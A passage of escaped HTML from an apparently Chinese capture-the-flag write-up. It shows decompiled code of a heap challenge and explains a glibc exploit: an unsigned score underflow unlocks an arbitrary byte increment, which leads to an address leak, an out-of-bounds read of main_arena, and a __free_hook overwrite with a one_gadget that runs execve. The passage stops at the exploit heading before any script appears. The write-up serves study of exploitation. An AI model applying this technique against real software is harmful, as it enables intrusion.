class=&#34;line&#34;&gt;32&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;33&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;34&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;35&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;36&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;37&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;38&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;type&#34;&gt;unsigned&lt;/span&gt; __int64 __fastcall &lt;span class=&#34;title function_&#34;&gt;set_mode&lt;/span&gt;&lt;span class=&#34;params&#34;&gt;(&lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; a1)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  student *v1; &lt;span class=&#34;comment&#34;&gt;// rbx&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; v3; &lt;span class=&#34;comment&#34;&gt;// [rsp+14h] [rbp-1Ch] BYREF&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;type&#34;&gt;unsigned&lt;/span&gt; __int64 v4; &lt;span class=&#34;comment&#34;&gt;// [rsp+18h] [rbp-18h]&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  v4 = __readfsqword(&lt;span class=&#34;number&#34;&gt;0x28&lt;/span&gt;u);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; ( nlist[a1]-&amp;gt;Type != &lt;span class=&#34;number&#34;&gt;1&lt;/span&gt; )&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; ( !nlist[a1]-&amp;gt;mode )&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      v1 = nlist[a1];&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      v1-&amp;gt;mode = &lt;span class=&#34;built_in&#34;&gt;calloc&lt;/span&gt;(&lt;span class=&#34;number&#34;&gt;1uLL&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;0x20&lt;/span&gt;uLL);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;built_in&#34;&gt;puts&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;enter your mode!&amp;quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    read(&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;, nlist[a1]-&amp;gt;mode, &lt;span class=&#34;number&#34;&gt;0x20&lt;/span&gt;uLL);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;goto&lt;/span&gt; LABEL_9;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;built_in&#34;&gt;puts&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;enter your pray score: 0 to 100&amp;quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  __isoc99_scanf(&lt;span class=&#34;string&#34;&gt;&amp;quot;%d&amp;quot;&lt;/span&gt;, &amp;amp;v3);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; ( v3 &amp;gt;= &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt; &amp;amp;&amp;amp; v3 &amp;lt;= &lt;span class=&#34;number&#34;&gt;100&lt;/span&gt; )&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    LOBYTE(nlist[a1]-&amp;gt;mode) = v3;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;LABEL_9:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;built_in&#34;&gt;puts&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;finish&amp;quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; __readfsqword(&lt;span class=&#34;number&#34;&gt;0x28&lt;/span&gt;u) ^ v4;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;built_in&#34;&gt;puts&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;bad!&amp;quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; __readfsqword(&lt;span class=&#34;number&#34;&gt;0x28&lt;/span&gt;u) ^ v4;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; __fastcall &lt;span class=&#34;title function_&#34;&gt;pray&lt;/span&gt;&lt;span class=&#34;params&#34;&gt;(&lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; a1)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;built_in&#34;&gt;puts&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;prayer...Good luck to you&amp;quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  nlist[a1]-&amp;gt;Type ^= &lt;span class=&#34;number&#34;&gt;1u&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;built_in&#34;&gt;puts&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;finish&amp;quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;当我们继续继续审计代码，发现 student 的 check rewiew 存在任意地址加一。&lt;/p&gt;
&lt;figure class=&#34;highlight c&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;30&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;31&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;32&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;33&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;34&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;type&#34;&gt;unsigned&lt;/span&gt; __int64 __fastcall &lt;span class=&#34;title function_&#34;&gt;checkfor_rewiew&lt;/span&gt;&lt;span class=&#34;params&#34;&gt;(&lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; a1)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  _BYTE *v1; &lt;span class=&#34;comment&#34;&gt;// rax&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;type&#34;&gt;char&lt;/span&gt; address[&lt;span class=&#34;number&#34;&gt;24&lt;/span&gt;]; &lt;span class=&#34;comment&#34;&gt;// [rsp+20h] [rbp-20h] BYREF&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;type&#34;&gt;unsigned&lt;/span&gt; __int64 v4; &lt;span class=&#34;comment&#34;&gt;// [rsp+38h] [rbp-8h]&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  v4 = __readfsqword(&lt;span class=&#34;number&#34;&gt;0x28&lt;/span&gt;u);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; ( nlist[a1]-&amp;gt;win == &lt;span class=&#34;number&#34;&gt;1&lt;/span&gt; )&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;built_in&#34;&gt;puts&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;already gained the reward!&amp;quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;keyword&#34;&gt;else&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; ( nlist[a1]-&amp;gt;stu-&amp;gt;score &amp;gt; &lt;span class=&#34;number&#34;&gt;0x59&lt;/span&gt;u )&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      &lt;span class=&#34;built_in&#34;&gt;printf&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;Good Job! Here is your reward! %p\n&amp;quot;&lt;/span&gt;, nlist[a1]);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      &lt;span class=&#34;built_in&#34;&gt;printf&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;add 1 to wherever you want! addr: &amp;quot;&lt;/span&gt;);&lt;span class=&#34;comment&#34;&gt;// 任意地址加1&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      read_addr(&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;, address, &lt;span class=&#34;number&#34;&gt;16&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      v1 = (_BYTE *)atol(address);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      ++*v1;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      nlist[a1]-&amp;gt;win = &lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; ( nlist[a1]-&amp;gt;stu-&amp;gt;comment )&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      &lt;span class=&#34;built_in&#34;&gt;puts&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;here is the review:&amp;quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      write(&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;, nlist[a1]-&amp;gt;stu-&amp;gt;comment, nlist[a1]-&amp;gt;stu-&amp;gt;size);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;else&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      &lt;span class=&#34;built_in&#34;&gt;puts&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;no reviewing yet!&amp;quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; __readfsqword(&lt;span class=&#34;number&#34;&gt;0x28&lt;/span&gt;u) ^ v4;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;看到这里时，我有想到将 student comment 的 size 进行加一，或者将 student win 加（但是没啥用好像）。&lt;/p&gt;
&lt;p&gt;再来，我们还需要关注 free，程序只给了我们三次机会，而且只是将 list 中保留的 student 结构体指针清空，而没有清空其他的数据。&lt;/p&gt;
&lt;figure class=&#34;highlight c&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;built_in&#34;&gt;puts&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;which student id to choose?&amp;quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      read(&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;, buf, &lt;span class=&#34;number&#34;&gt;5uLL&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      idx = atoi(buf);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; ( idx &amp;gt;= &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt; &amp;amp;&amp;amp; idx &amp;lt;= &lt;span class=&#34;number&#34;&gt;9&lt;/span&gt; &amp;amp;&amp;amp; nlist[idx] )&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;built_in&#34;&gt;printf&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;bad luck for student %d! Say goodbye to him/her!&amp;quot;&lt;/span&gt;, (&lt;span class=&#34;type&#34;&gt;unsigned&lt;/span&gt; &lt;span class=&#34;type&#34;&gt;int&lt;/span&gt;)idx);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; ( nlist[idx]-&amp;gt;stu-&amp;gt;message )&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;          &lt;span class=&#34;built_in&#34;&gt;free&lt;/span&gt;(nlist[idx]-&amp;gt;stu-&amp;gt;message);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;built_in&#34;&gt;free&lt;/span&gt;(nlist[idx]-&amp;gt;stu);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;built_in&#34;&gt;free&lt;/span&gt;(nlist[idx]);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        nlist[idx] = &lt;span class=&#34;number&#34;&gt;0LL&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        --count;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;接下来思考程序对于堆块数据的输出。只有在 student 模式的 check review 可以输出 comment。&lt;/p&gt;
&lt;h2 id=&#34;着手漏洞&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#着手漏洞&#34;&gt;#&lt;/a&gt; 着手漏洞&lt;/h2&gt;
&lt;h3 id=&#34;泄露地址&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#泄露地址&#34;&gt;#&lt;/a&gt; 泄露地址&lt;/h3&gt;
&lt;p&gt;check review 有机会直接输出 student 的地址，但是分数需要够 96, 但是正常情况下是不可以的，因为 question 只能是 0~6，但是我们发现，如果学生进行过 pre，再次打分，就会被扣 10 分，而且数据比较的时候是无符号数，所以只要 question 数为 1，在 pray，被扣 10 分就会成为一个大数。输出 chunk 的地址。这里也解决了一个问题就是，因为我们释放次数有限，而且堆块大小也不可以超过 0x3ff，free 后 chunk 全部进入 tcache，没法泄露 libc，所以我们利用任意地址（一字节的数据类型）加 1，可以将一个 chunk 变得很大，free 后就可以进入 unsortedbin，后面可以申请出来，即使 tcache, 存在，也会优先使用 unsortedbin. 所以我们只要后面 write review 的时候，size&amp;lt;=8, 就可以保留 bk 指针不被修改。但是这里我们可以用更简单的方式，直接将 size 变得更大，（两个方法都要修改保存的 comment size），直接越界输出 main_arena。&lt;/p&gt;
&lt;p&gt;后面就是一个常规的想法，因为 chunk 上有 comment 的指针，所以我们利用上面的溢出，将指针改写为 free_hook，然后再编辑该 review，把 onegadget 写入。最后 free 实际就是调用 execve ().&lt;/p&gt;
&lt;h2 id=&#34;exp&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#exp&#34;&gt;#&lt;/a&gt; exp&lt;/h2&gt;
&lt;figure class=&#34;highlight python&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;30&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;31&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;32&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;33&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;34&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;35&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;36&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;37&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;38&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;39&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;40&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;41&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;42&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;43&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;44&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;45&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;46&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;47&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;48&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;49&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;50&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;51&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;52&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;53&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;54&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;55&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;56&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;57&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;58&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;59&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;60&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;61&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;62&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;63&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;64&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;65&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;66&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;67&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;68&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;69&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;70&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;71&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;72&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;73&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;74&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;75&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;76&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;77&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;78&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;79&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;80&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;81&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;82&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;83&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;84&lt;/span&gt;&lt;br&gt;&lt;span 